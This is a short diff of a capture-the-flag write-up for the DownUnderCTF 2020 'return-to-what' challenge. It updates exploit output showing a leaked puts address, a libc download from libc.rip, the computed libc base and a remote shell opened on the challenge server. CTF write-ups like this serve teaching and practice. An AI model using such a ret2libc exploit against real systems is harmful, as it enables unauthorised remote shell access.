@@ -159,14 +159,15 @@ Output:
     PIE:      No PIE (0x400000)
 [+] Opening connection to chal.duc.tf on port 30003: Done
 [*] Loaded 14 cached gadgets for './return-to-what'
-[*] puts: 0x7fa650a129c0
+[*] puts: 0x7f47c1e5c9c0
+[*] getting: https://libc.rip/download/libc6_2.27-3ubuntu1_amd64.so
 [*] '/pwd/datajerk/downunderctf2020/return_to_what/libc6_2.27-3ubuntu1_amd64.so'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      PIE enabled
-[*] libc.address: 0x7fa650992000
+[*] libc.address: 0x7f47c1ddc000
 [*] Switching to interactive mode
 $ id
 uid=1000 gid=999 groups=999
